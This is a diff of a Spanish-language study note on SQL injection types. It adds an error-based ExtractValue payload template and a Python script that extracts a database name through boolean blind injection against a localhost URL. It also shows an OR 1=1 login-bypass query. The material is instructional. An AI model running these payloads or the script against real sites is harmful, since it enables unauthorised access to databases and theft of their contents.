@@ -3,14 +3,22 @@
 ### Indice
 - [Tipos y funcionamiento general](#como)
 - #### IN BAND
-  *   [Union](#union)
-  *   [Error](#error)
+  *   [Union-Based](#union)
+  *   [Error-Based](#error)
 - #### BLIND
   *   [Boolean](#boolean)
   *   [Time](#tine)
 - #### OUT OF BAND
   *   [Out of band](#out)
 - <a href="https://deephacking.tech/sql-injection/">Mas info</a>
+
+
+
+
+
+
+
+
 <a name="como"></a>
 ## Tipos y funcionamiento
 Tenemos 3 tipos:
@@ -50,10 +58,19 @@ SELECT email,pass WHERE email = "eddy@gmail.com" OR 1=1 AND pass ="contraseña12
 con lo cual la lógica de base de datos, diría que si el email está contenido en la base de datos o 1 es igual a 1, cosa que siempre se cumple. iniciaremos sesión con el primer usuario de la tabla.
 
 
+
+
+
+
+
+
+
+
+
 ## IN BAND
 
 <a name="union"></a>
-### Union
+### Union-Based
 Hay que tener en cuenta que cuando realizamos la instruccion UNION entre dos SELECT, ambos select deben tener el mismo numero de columnas. asi que lo primero es determinar el numero de columnas de la query que esta corriendo en el servidor.  
 se puede hacer con un order by, ejemplo:  
 
@@ -103,3 +120,69 @@ APUNTES:
 - el concat no es siempre necesario
 - 0x3a en hexadecimal significa los dos puntos ":"
 - el where no deberia ser necesario en caso de usuarios y claves xq ya la web está preparada para consultar en esa base de datos
+
+
+
+
+
+<a name="error"></a>
+### Error-Based
+ Este tipo de SQL Injection consiste en ocasionar a propósito un error en el servidor, de tal forma, que en esta respuesta, consigamos resultados de la base de datos.  
+```
+' AND ExtractValue(”,Concat(‘=’,(<SENTENCIA SQL>)))-- -
+```
+
+En la parte de SENTENCIA SQL, pondríamos las sentencias que quisieramos ejecutar.  
+
+## BLIND
+
+<a name="boolean"></a>
+### Boolean
+En este tipo de injecciones no vemos el resultado de la consulta en la propia respuesta del servidor. Para poder realizar la consulta, requeriremos del siguiente script en python3, donde deberiamos modificar la URL y la sentencia:  
+```
+#!/usr/bin/python3
+
+import requests
+import sys
+
+mayusc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+minusc = mayusc.lower()
+numbers = '1234567890'
+simbols = '|@#~!"·$%&/()=:.-_,; <>[]{}?\r\n'
+
+dictionary = minusc + mayusc + numbers + simbols
+
+def booleanSQL():
+
+        global info
+        info = ''
+
+        for i in range(1,100):
+
+                stop = False
+
+                for j in dictionary:
+
+                        response = requests.get("http://localhost/books.php?id=1 AND SUBSTR(database(), %d, 1)='%s'#" % (i, j))
+
+                        if 'La peticion se ha realizado' in response.text:
+
+                                print("La letra numero %d es %s" % (i, j))
+
+                                info += j
+
+                                stop = False
+
+                                break
+
+                        stop = True
+
+                if stop:
+                        break
+
+if __name__ == '__main__':
+
+        booleanSQL()
+
+        print("\nLa base de datos se llama %s" % info)
+```
